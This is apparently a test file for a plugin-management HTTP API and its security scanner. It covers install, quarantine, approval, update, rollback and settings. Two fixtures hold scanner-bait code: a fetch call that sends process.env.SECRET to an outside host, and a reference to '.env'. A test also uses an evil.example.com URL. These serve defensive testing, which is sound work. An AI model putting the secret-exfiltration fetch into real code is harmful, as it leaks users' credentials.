/**
 * PROP-090 §«HTTP API», Ф5б-2: тесты фабрик `/api/v2/plugins*` и
 * `/api/v2/settings/plugins`.
 *
 * Стенд — **реальные** `PluginRuntime` + `PluginInstaller` на временном каталоге
 * (`mkdtemp`), как в `installer.test.ts`/`runtime.test.ts`: HTTP-слой должен
 * проверяться поверх настоящего установщика (манифест → скан → политика →
 * раскладка → lock), иначе маппинг причин → HTTP проверялся бы на моках, а не на
 * фактических `PluginAuditReason`. Порты хранения — in-memory
 * (`MemoryPluginLockRepository`, `MemoryPluginAuditRepository`), настройки —
 * `MemorySettingsRepository` (тот же порт `SettingsRepository`, что у файловой
 * реализации, ADR-096).
 */
import { afterEach, describe, expect, it } from 'vitest';
import { Hono } from 'hono';
import type { Context, Next } from 'hono';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import type { PackManifest, PluginsConfig } from '@itphx/synth-shared';
import { pluginsConfigSchema } from '@itphx/synth-shared';

import { PromptBlockRegistry } from '../../engine/context/prompt-block-registry.js';
import { LlmFilterRegistry } from '../../engine/gateway/llm-filter-registry.js';
import { createToolRegistry } from '../../engine/tools/index.js';
import { MemoryPluginAuditRepository } from '../../storage/memory/plugin-audit.js';
import { MemoryPluginLockRepository } from '../../storage/memory/plugin-lock.js';
import { MemorySettingsRepository } from '../../storage/memory/settings.js';
import { resolvePluginLayout } from '../../engine/plugins/layout.js';
import { PluginRuntime } from '../../engine/plugins/runtime.js';
import type { PluginSourceContext } from '../../engine/plugins/sources.js';
import { buildTarGz } from '../../test-helpers/tar-fixture.js';
import {
  PLUGIN_REASON_HTTP,
  createPluginSettingsRoutes,
  createPluginsRoutes,
} from './plugins.js';
import type { PluginsRoutesDeps } from './plugins.js';

/** Временные каталоги теста (убираются в `afterEach`). */
const tempDirs: string[] = [];

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
});

/** Создать временный каталог (учитывается в уборке). */
async function makeTempDir(prefix: string): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

/** Мок auth: `requireAuth` — no-op (single-user режим core). */
function createMockAuth() {
  return {
    requireAuth: async (_c: Context, next: Next) => {
      await next();
    },
  };
}

/** Конфиг слоя: установка во время работы разрешена, доверие — без порога. */
function config(over: Partial<PluginsConfig> = {}): PluginsConfig {
  return {
    ...pluginsConfigSchema.parse({
      runtimeInstall: 'allow',
      trustFloor: 'community',
      executionEnabled: true,
    }),
    ...over,
  };
}

/** Манифест плагина: объявляет один блок промпта (совпадает с кодом бандла). */
function manifest(over: Partial<PackManifest> = {}): PackManifest {
  const name = over.name ?? 'demo-plugin';
  return {
    name,
    version: '1.0.0',
    kind: 'plugin',
    description: 'демонстрационный плагин',
    provides: {
      mcp: [],
      skills: [],
      agents: [],
      pipelines: [],
      tools: [],
      promptBlocks: [{ key: `plugin.${name}.tip`, tier: 'context', order: 10 }],
      llmFilters: [],
    },
    ...over,
  } as PackManifest;
}

/** Код бандла: регистрирует блок промпта, объявленный в манифесте. */
function blockCode(name: string): string {
  return (
    'export function apply(facade) {\n' +
    '  facade.registerPromptBlock({\n' +
    `    key: 'plugin.${name}.tip',\n` +
    "    tier: 'context',\n" +
    '    order: 10,\n' +
    "    load: () => 'PLUGIN-TIP',\n" +
    '  });\n' +
    '}\n'
  );
}

/** Каталог бандла: `synth.pack` + `dist/index.js` (код переопределяем). */
async function makeBundle(
  opts: { manifest?: PackManifest; code?: string; omitManifest?: boolean } = {},
): Promise<string> {
  const dir = await makeTempDir('synth-plugin-routes-');
  const m = opts.manifest ?? manifest();
  if (!opts.omitManifest) {
    await writeFile(join(dir, 'synth.pack'), `${JSON.stringify(m, null, 2)}\n`, 'utf-8');
  }
  await mkdir(join(dir, 'dist'), { recursive: true });
  await writeFile(join(dir, 'dist', 'index.js'), opts.code ?? blockCode(m.name), 'utf-8');
  return dir;
}

/** Стенд: приложение с обеими фабриками + реальный рантайм плагинов. */
interface Stand {
  app: Hono;
  runtime: PluginRuntime;
  settings: MemorySettingsRepository;
  dataDir: string;
  /** Вызовы `onPluginsChange` (живые бюджеты, долги Д3). */
  changes: Array<Record<string, unknown>>;
}

async function makeStand(
  opts: {
    config?: PluginsConfig;
    localInstall?: boolean;
    sourceContext?: PluginSourceContext;
  } = {},
): Promise<Stand> {
  const dataDir = await makeTempDir('synth-plugin-routes-data-');
  const cfg = opts.config ?? config();
  const settings = new MemorySettingsRepository();
  const runtime = new PluginRuntime({
    layout: resolvePluginLayout({ dataDir, home: null, env: {} }),
    config: cfg,
    hostVersion: '0.0.0-test',
    audit: new MemoryPluginAuditRepository(),
    lock: new MemoryPluginLockRepository(),
    promptBlocks: new PromptBlockRegistry(),
    llmFilters: new LlmFilterRegistry(),
    tools: createToolRegistry(),
    // Тишина в выводе теста: старт-активация/установка пишут warn при отказах.
    logger: { warn: () => undefined },
  });

  const deps: PluginsRoutesDeps = {
    runtime,
    config: cfg,
    settings,
    localInstall: opts.localInstall ?? true,
    ...(opts.sourceContext ? { sourceContext: opts.sourceContext } : {}),
  };

  const app = new Hono();
  const auth = createMockAuth();
  app.route('/api/v2/plugins', createPluginsRoutes(auth, deps));
  const changes: Array<Record<string, unknown>> = [];
  app.route('/api/v2/settings', createPluginSettingsRoutes(auth, {
    config: cfg,
    settings,
    running: runtime.config,
    // Долги Д3: живые ключи — проверяем, что колбэк получает эффективные значения.
    onPluginsChange: (effective) => {
      changes.push({
        promptBlockMaxChars: effective.promptBlockMaxChars,
        llmFilterTimeoutMs: effective.llmFilterTimeoutMs,
      });
    },
  }));
  return { app, runtime, settings, dataDir, changes };
}

/** Вызов с JSON-телом. */
function jsonReq(
  app: Hono,
  method: string,
  path: string,
  body?: unknown,
): Promise<Response> {
  return Promise.resolve(
    app.request(path, {
      method,
      headers: { 'Content-Type': 'application/json' },
      ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    }),
  );
}

/** Тело ошибки `{error:{code,message}}`. */
async function errorOf(res: Response): Promise<{ code: string; message: string }> {
  const body = (await res.json()) as { error?: { code: string; message: string } };
  expect(body.error, 'ответ должен содержать {error:{code,message}}').toBeDefined();
  return body.error!;
}

describe('Plugins API — жизненный цикл (PROP-090 Ф5б-2)', () => {
  it('GET /plugins: пусто → {plugins: []}; после установки — запись со статусом', async () => {
    const { app } = await makeStand();

    const empty = await app.request('/api/v2/plugins');
    expect(empty.status).toBe(200);
    expect(await empty.json()).toEqual({ plugins: [] });

    const bundle = await makeBundle();
    const installed = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(installed.status).toBe(201);

    const list = (await (await app.request('/api/v2/plugins')).json()) as {
      plugins: Array<{ name: string; version: string; active: boolean; trustLevel: string }>;
    };
    expect(list.plugins).toHaveLength(1);
    expect(list.plugins[0]).toMatchObject({
      name: 'demo-plugin',
      version: '1.0.0',
      active: false,
      trustLevel: 'community',
    });
  });

  it('GET /plugins/:name: манифест и PLUGIN_INTEGRITY.json в детали; неизвестный → 404', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    const res = await app.request('/api/v2/plugins/demo-plugin');
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      plugin: { name: string; contentHash: string };
      manifest?: { name: string; kind: string };
      integrity?: { sha256: string; trust_level?: string; install_kind?: string };
    };
    expect(body.plugin.name).toBe('demo-plugin');
    expect(body.manifest).toMatchObject({ name: 'demo-plugin', kind: 'plugin' });
    expect(body.integrity?.sha256).toBe(body.plugin.contentHash);
    expect(body.integrity?.trust_level).toBe('community');
    expect(body.integrity?.install_kind).toBe('runtime');

    const missing = await app.request('/api/v2/plugins/nope');
    expect(missing.status).toBe(404);
    expect((await errorOf(missing)).code).toBe('plugin.not_found');
  });

  it('GET /plugins/:name: битый манифест в каталоге — 200 без поля manifest (не 500)', async () => {
    const { app, runtime } = await makeStand();
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    // Порча файла в каталоге установки: запись lock остаётся, деталь — без манифеста.
    const dir = join(runtime.layout.installedDir, 'demo-plugin@1.0.0');
    await writeFile(join(dir, 'synth.pack'), '{ broken json', 'utf-8');

    const res = await app.request('/api/v2/plugins/demo-plugin');
    expect(res.status).toBe(200);
    const body = (await res.json()) as { manifest?: unknown; plugin: { name: string } };
    expect(body.manifest).toBeUndefined();
    expect(body.plugin.name).toBe('demo-plugin');
  });

  it('POST /plugins/install: localInstall=false → 403 LOCAL_INSTALL_DISABLED', async () => {
    const { app } = await makeStand({ localInstall: false });
    const bundle = await makeBundle();
    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(res.status).toBe(403);
    expect((await errorOf(res)).code).toBe('LOCAL_INSTALL_DISABLED');
  });

  it('POST /plugins/install: пустой path и невалидный trustLevel → 400 VALIDATION_ERROR', async () => {
    const { app } = await makeStand();

    const noPath = await jsonReq(app, 'POST', '/api/v2/plugins/install', {});
    expect(noPath.status).toBe(400);
    expect((await errorOf(noPath)).code).toBe('VALIDATION_ERROR');

    const bundle = await makeBundle();
    const badTrust = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      path: bundle,
      trustLevel: 'ultimate',
    });
    expect(badTrust.status).toBe(400);
    expect((await errorOf(badTrust)).code).toBe('VALIDATION_ERROR');
  });

  it('POST /plugins/install: нет synth.pack → 400 plugin.source_unavailable (локальный источник)', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle({ omitManifest: true });
    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(res.status).toBe(400);
    expect((await errorOf(res)).code).toBe('plugin.source_unavailable');
  });

  it('POST /plugins/install: доверие ниже trust-floor → 403 plugin.trust_below_floor', async () => {
    const { app } = await makeStand({ config: config({ trustFloor: 'trusted' }) });
    const bundle = await makeBundle();
    // trustLevel по умолчанию — community (fail-closed), ниже порога trusted.
    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(res.status).toBe(403);
    expect((await errorOf(res)).code).toBe('plugin.trust_below_floor');
  });

  it('POST /plugins/install: вердикт caution → 202 approval_required (карантин)', async () => {
    const { app, runtime } = await makeStand();
    // `process.env` + сетевой вызов — правило exfil_env_network (medium) → caution.
    const bundle = await makeBundle({
      code:
        'export function apply() {}\n' +
        'export const leak = () => fetch("https://example.com", { body: process.env.SECRET });\n',
    });
    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(res.status).toBe(202);
    const body = (await res.json()) as { outcome: string; name: string; version: string; reason: string };
    expect(body.outcome).toBe('approval_required');
    expect(body.name).toBe('demo-plugin');
    expect(body.version).toBe('1.0.0');
    expect(body.reason).toContain('карантин');

    // В lock записи нет (карантин), список пуст.
    expect(await runtime.list()).toEqual([]);
  });

  it('POST /plugins/install: вердикт dangerous → 409 plugin.scan_rejected', async () => {
    const { app } = await makeStand();
    // Обращение к `.env` — правило exfil_secret_path (high) → dangerous.
    const bundle = await makeBundle({
      code: 'export function apply() { return ".env"; }\n',
    });
    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(res.status).toBe(409);
    expect((await errorOf(res)).code).toBe('plugin.scan_rejected');
  });

  it('POST /plugins/install: runtimeInstall=deny → 403 plugin.runtime_install_denied', async () => {
    const { app } = await makeStand({ config: config({ runtimeInstall: 'deny' }) });
    const bundle = await makeBundle();
    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle });
    expect(res.status).toBe(403);
    expect((await errorOf(res)).code).toBe('plugin.runtime_install_denied');
  });

  it('POST /plugins/:name/approve: подтверждение карантина → 200 installed; неизвестный → 404', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle({
      code:
        'export function apply() {}\n' +
        'export const leak = () => fetch("https://example.com", { body: process.env.SECRET });\n',
    });
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(202);

    const approved = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/approve');
    expect(approved.status).toBe(200);
    const body = (await approved.json()) as { outcome: string; name: string; contentHash: string };
    expect(body.outcome).toBe('installed');
    expect(body.name).toBe('demo-plugin');
    expect(body.contentHash).toMatch(/^[0-9a-f]{64}$/);

    const missing = await jsonReq(app, 'POST', '/api/v2/plugins/absent/approve');
    expect(missing.status).toBe(404);
    expect((await errorOf(missing)).code).toBe('plugin.not_found');
  });

  it('POST /plugins/:name/enable и /disable: активация → 200, повторный disable → 404', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    const enabled = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/enable');
    expect(enabled.status).toBe(200);
    const activated = (await enabled.json()) as {
      activation: { outcome: string; plugin: string; version: string };
    };
    expect(activated.activation.outcome).toBe('activated');

    // Активность видна в списке.
    const list = (await (await app.request('/api/v2/plugins')).json()) as {
      plugins: Array<{ active: boolean }>;
    };
    expect(list.plugins[0]?.active).toBe(true);

    const disabled = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/disable');
    expect(disabled.status).toBe(200);
    const deactivated = (await disabled.json()) as { deactivation: { outcome: string; disposed: number } };
    expect(deactivated.deactivation.outcome).toBe('ok');
    expect(deactivated.deactivation.disposed).toBeGreaterThanOrEqual(1);

    // Спека: disable неактивного — 404 `plugin.not_active` (идемпотентности нет).
    const again = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/disable');
    expect(again.status).toBe(404);
    expect((await errorOf(again)).code).toBe('plugin.not_active');
  });

  it('POST /plugins/:name/enable: отказ по гейту → 409; нет в lock → 404', async () => {
    const { app } = await makeStand({ config: config({ executionEnabled: false }) });
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    const denied = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/enable');
    expect(denied.status).toBe(409);
    const body = (await denied.json()) as { error: { code: string }; activation: { outcome: string } };
    expect(body.error.code).toBe('plugin.execution_disabled');
    expect(body.activation.outcome).toBe('rejected');

    const missing = await jsonReq(app, 'POST', '/api/v2/plugins/absent/enable');
    expect(missing.status).toBe(404);
    expect((await errorOf(missing)).code).toBe('plugin.not_found');
  });

  it('DELETE /plugins/:name: 204 и идемпотентность (повтор — тоже 204)', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    const first = await app.request('/api/v2/plugins/demo-plugin', { method: 'DELETE' });
    expect(first.status).toBe(204);
    expect(await first.text()).toBe('');

    const list = (await (await app.request('/api/v2/plugins')).json()) as { plugins: unknown[] };
    expect(list.plugins).toEqual([]);

    const second = await app.request('/api/v2/plugins/demo-plugin', { method: 'DELETE' });
    expect(second.status).toBe(204);
  });

  it('POST /plugins/update: 200 unchanged/updated, 400 VALIDATION_ERROR, 404 not_found', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    // Бандл источника тот же — обновлять нечего.
    const unchanged = await jsonReq(app, 'POST', '/api/v2/plugins/update', {
      name: 'demo-plugin',
    });
    expect(unchanged.status).toBe(200);
    const unchangedBody = (await unchanged.json()) as { outcome: string; version: string };
    expect(unchangedBody.outcome).toBe('unchanged');
    expect(unchangedBody.version).toBe('1.0.0');

    // Версия в бандле источника выросла → installed + previous в lock.
    await writeFile(
      join(bundle, 'synth.pack'),
      `${JSON.stringify(manifest({ version: '2.0.0' }), null, 2)}\n`,
      'utf-8',
    );
    const updated = await jsonReq(app, 'POST', '/api/v2/plugins/update', {
      name: 'demo-plugin',
    });
    expect(updated.status).toBe(200);
    const updatedBody = (await updated.json()) as {
      outcome: string;
      version: string;
      previousVersion: string;
      contentHash: string;
    };
    expect(updatedBody.outcome).toBe('updated');
    expect(updatedBody.version).toBe('2.0.0');
    expect(updatedBody.previousVersion).toBe('1.0.0');

    // Тело: `name` обязателен; `sha256` — 64 hex.
    expect(
      (await errorOf(await jsonReq(app, 'POST', '/api/v2/plugins/update', {}))).code,
    ).toBe('VALIDATION_ERROR');
    expect(
      (await errorOf(await jsonReq(app, 'POST', '/api/v2/plugins/update', { name: 'x', sha256: 'abc' })))
        .code,
    ).toBe('VALIDATION_ERROR');

    const missing = await jsonReq(app, 'POST', '/api/v2/plugins/update', { name: 'absent' });
    expect(missing.status).toBe(404);
    expect((await errorOf(missing)).code).toBe('plugin.not_found');
  });

  it('POST /plugins/:name/rollback: 200 rolled_back, 409 без previous, 404 not_found', async () => {
    const { app } = await makeStand();
    const bundle = await makeBundle();
    expect((await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: bundle })).status).toBe(201);

    // Плагин не обновлялся — ступени отката нет.
    const noPrevious = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/rollback');
    expect(noPrevious.status).toBe(409);
    expect((await errorOf(noPrevious)).code).toBe('plugin.rollback_unavailable');

    // Обновление → откат возвращает прежнюю версию (swap).
    await writeFile(
      join(bundle, 'synth.pack'),
      `${JSON.stringify(manifest({ version: '2.0.0' }), null, 2)}\n`,
      'utf-8',
    );
    expect(
      (await jsonReq(app, 'POST', '/api/v2/plugins/update', { name: 'demo-plugin' })).status,
    ).toBe(200);

    const rolledBack = await jsonReq(app, 'POST', '/api/v2/plugins/demo-plugin/rollback');
    expect(rolledBack.status).toBe(200);
    const body = (await rolledBack.json()) as {
      outcome: string;
      version: string;
      previousVersion: string;
    };
    expect(body.outcome).toBe('rolled_back');
    expect(body.version).toBe('1.0.0');
    expect(body.previousVersion).toBe('2.0.0');

    const missing = await jsonReq(app, 'POST', '/api/v2/plugins/absent/rollback');
    expect(missing.status).toBe(404);
    expect((await errorOf(missing)).code).toBe('plugin.not_found');
  });
});

describe('Plugins API — таблица причин → HTTP', () => {
  it('исчерпывающая и без «немого» 2xx для отказов', () => {
    // Каждая причина из журнала аудита имеет код ответа; `approval_required` —
    // единственная 2xx-ячейка (202), `already_active` — 200 (состояние достигнуто).
    expect(PLUGIN_REASON_HTTP['plugin.manifest_invalid']).toBe(400);
    expect(PLUGIN_REASON_HTTP['plugin.trust_below_floor']).toBe(403);
    expect(PLUGIN_REASON_HTTP['plugin.runtime_install_denied']).toBe(403);
    expect(PLUGIN_REASON_HTTP['plugin.scan_disabled_with_execution']).toBe(403);
    expect(PLUGIN_REASON_HTTP['plugin.scan_rejected']).toBe(409);
    expect(PLUGIN_REASON_HTTP['plugin.not_found']).toBe(404);
    expect(PLUGIN_REASON_HTTP['plugin.rollback_unavailable']).toBe(409);
    expect(PLUGIN_REASON_HTTP['plugin.approval_required']).toBe(202);
    const twoHundreds = Object.entries(PLUGIN_REASON_HTTP)
      .filter(([, status]) => status < 400)
      .map(([reason]) => reason)
      .sort();
    expect(twoHundreds).toEqual(['plugin.already_active', 'plugin.approval_required']);
  });
});

describe('Plugin settings API — /api/v2/settings/plugins (PROP-090 §10)', () => {
  it('GET: дефолты из config, пустой override, restartRequired=true, running', async () => {
    const { app } = await makeStand();
    const res = await app.request('/api/v2/settings/plugins');
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      plugins: Record<string, unknown>;
      defaults: PluginsConfig;
      isOverridden: boolean;
      restartRequired: boolean;
      running: PluginsConfig;
    };
    expect(body.plugins).toEqual({});
    expect(body.isOverridden).toBe(false);
    // Пересборка рантайма плагинов — только рестартом (инвариант 24).
    expect(body.restartRequired).toBe(true);
    expect(body.defaults.executionEnabled).toBe(true);
    expect(body.defaults.trustFloor).toBe('community');
    expect(body.running.trustFloor).toBe('community');
  });

  it('PUT: частичный патч сохраняется в runtime-override, ответ как GET', async () => {
    const { app, settings } = await makeStand();
    const res = await jsonReq(app, 'PUT', '/api/v2/settings/plugins', {
      executionEnabled: false,
      promptBlockMaxChars: 1234,
    });
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      plugins: Record<string, unknown>;
      isOverridden: boolean;
      restartRequired: boolean;
    };
    expect(body.plugins).toEqual({ executionEnabled: false, promptBlockMaxChars: 1234 });
    expect(body.isOverridden).toBe(true);
    expect(body.restartRequired).toBe(true);
    // Патч действительно ушёл в порт настроек (переживёт рестарт).
    expect(await settings.getPlugins()).toEqual({
      executionEnabled: false,
      promptBlockMaxChars: 1234,
    });
  });

  it('PUT: невалидные значения и неизвестный ключ → 400 VALIDATION_ERROR', async () => {
    const { app } = await makeStand();

    const badEnum = await jsonReq(app, 'PUT', '/api/v2/settings/plugins', { scan: 'maybe' });
    expect(badEnum.status).toBe(400);
    expect((await errorOf(badEnum)).code).toBe('VALIDATION_ERROR');

    const badType = await jsonReq(app, 'PUT', '/api/v2/settings/plugins', {
      promptBlockMaxChars: 'много',
    });
    expect(badType.status).toBe(400);

    // Опечатка в имени политики не должна «тихо» игнорироваться (strict).
    const unknownKey = await jsonReq(app, 'PUT', '/api/v2/settings/plugins', {
      executionEnable: true,
    });
    expect(unknownKey.status).toBe(400);
    expect((await errorOf(unknownKey)).code).toBe('VALIDATION_ERROR');
  });

  it('DELETE: сброс runtime-override → isOverridden=false, дефолты прежние', async () => {
    const { app } = await makeStand();
    expect(
      (await jsonReq(app, 'PUT', '/api/v2/settings/plugins', { scan: 'disabled' })).status,
    ).toBe(200);

    const res = await app.request('/api/v2/settings/plugins', { method: 'DELETE' });
    expect(res.status).toBe(200);
    const body = (await res.json()) as {
      plugins: Record<string, unknown>;
      isOverridden: boolean;
      restartRequired: boolean;
      defaults: PluginsConfig;
    };
    expect(body.plugins).toEqual({});
    expect(body.isOverridden).toBe(false);
    expect(body.restartRequired).toBe(true);
    expect(body.defaults.scan).toBe('enabled');
  });
});

describe('Plugins API — источники установки (Д1)', () => {
  /** Каталог бандла → `.tgz` в отдельном временном каталоге (файл на диске). */
  async function makeBundleArchive(name = 'demo-plugin'): Promise<string> {
    const bundle = await makeBundle({ manifest: manifest({ name }) });
    const pack = await readFile(join(bundle, 'synth.pack'), 'utf-8');
    const code = await readFile(join(bundle, 'dist', 'index.js'), 'utf-8');
    const dir = await makeTempDir('synth-plugin-routes-tgz-');
    const path = join(dir, `${name}.tgz`);
    await writeFile(
      path,
      buildTarGz([
        { name: 'synth.pack', content: pack },
        { name: 'dist/index.js', content: code },
      ]),
    );
    return path;
  }

  it('POST /install {source:"archive", path} → 201, бандл распакован и установлен', async () => {
    const { app, runtime } = await makeStand();
    const archivePath = await makeBundleArchive();

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      source: 'archive',
      path: archivePath,
    });

    expect(res.status).toBe(201);
    const body = (await res.json()) as { outcome: string };
    expect(body.outcome).toBe('installed');
    expect((await runtime.list()).map((entry) => entry.name)).toEqual(['demo-plugin']);
  });

  it('{path} с расширением .tgz без source → вид выводится как archive (201)', async () => {
    const { app } = await makeStand();
    const archivePath = await makeBundleArchive('arch-plugin');

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', { path: archivePath });

    expect(res.status).toBe(201);
  });

  it('{name:"https://…"} → 400 VALIDATION_ERROR (npm-имя обязательно)', async () => {
    const { app } = await makeStand();

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      name: 'https://evil.example.com/plugin.tgz',
    });

    expect(res.status).toBe(400);
    expect((await errorOf(res)).code).toBe('VALIDATION_ERROR');
  });

  it('{source:"url"} без sha256 → 400 (pin обязателен)', async () => {
    const { app } = await makeStand();

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      source: 'url',
      url: 'https://example.com/plugin.tgz',
    });

    expect(res.status).toBe(400);
    expect((await errorOf(res)).message).toContain('sha256');
  });

  it('тело-не-объект (`null`) → 400, а не 500', async () => {
    const { app } = await makeStand();

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', null);

    expect(res.status).toBe(400);
    expect((await errorOf(res)).code).toBe('VALIDATION_ERROR');
  });

  it('{source:"ftp"} (неизвестный вид) → 400', async () => {
    const { app } = await makeStand();

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      source: 'ftp',
      path: '/tmp/x',
    });

    expect(res.status).toBe(400);
    expect((await errorOf(res)).code).toBe('VALIDATION_ERROR');
  });

  it('npm-источник, реестр ответил 404 → 502 plugin.source_unavailable', async () => {
    const { app } = await makeStand({
      sourceContext: { fetch: async () => new Response('not found', { status: 404 }) },
    });

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      source: 'npm',
      name: 'demo-plugin',
    });

    expect(res.status).toBe(502);
    expect((await errorOf(res)).code).toBe('plugin.source_unavailable');
  });

  it('managed: локальный архив → 403 LOCAL_INSTALL_DISABLED', async () => {
    const { app } = await makeStand({ localInstall: false });
    const dir = await makeTempDir('synth-plugin-routes-managed-');
    const archivePath = join(dir, 'demo.tgz');
    await writeFile(archivePath, buildTarGz([{ name: 'synth.pack', content: '{}' }]));

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      source: 'archive',
      path: archivePath,
    });

    expect(res.status).toBe(403);
    expect((await errorOf(res)).code).toBe('LOCAL_INSTALL_DISABLED');
  });

  it('managed: сетевой источник разрешён (не 403; сбой реестра → 502)', async () => {
    const { app } = await makeStand({
      localInstall: false,
      sourceContext: { fetch: async () => new Response('boom', { status: 500 }) },
    });

    const res = await jsonReq(app, 'POST', '/api/v2/plugins/install', {
      source: 'npm',
      name: 'demo-plugin',
    });

    expect(res.status).toBe(502);
  });
});

describe('настройки плагинов: живые бюджеты (долги Д3)', () => {
  it('PUT вызывает onPluginsChange с эффективными значениями (config + runtime)', async () => {
    const { app, changes } = await makeStand();
    const res = await jsonReq(app, 'PUT', '/api/v2/settings/plugins', {
      promptBlockMaxChars: 1234,
      llmFilterTimeoutMs: 250,
    });
    expect(res.status).toBe(200);
    expect(changes.at(-1)).toEqual({ promptBlockMaxChars: 1234, llmFilterTimeoutMs: 250 });
  });

  it('DELETE возвращает дефолты config и тоже уведомляет', async () => {
    const { app, changes } = await makeStand();
    await jsonReq(app, 'PUT', '/api/v2/settings/plugins', { promptBlockMaxChars: 999 });
    await jsonReq(app, 'DELETE', '/api/v2/settings/plugins');
    const last = changes.at(-1) as { promptBlockMaxChars?: number; llmFilterTimeoutMs?: number };
    expect(last.promptBlockMaxChars).toBe(4000);
    expect(last.llmFilterTimeoutMs).toBe(1000);
  });
});
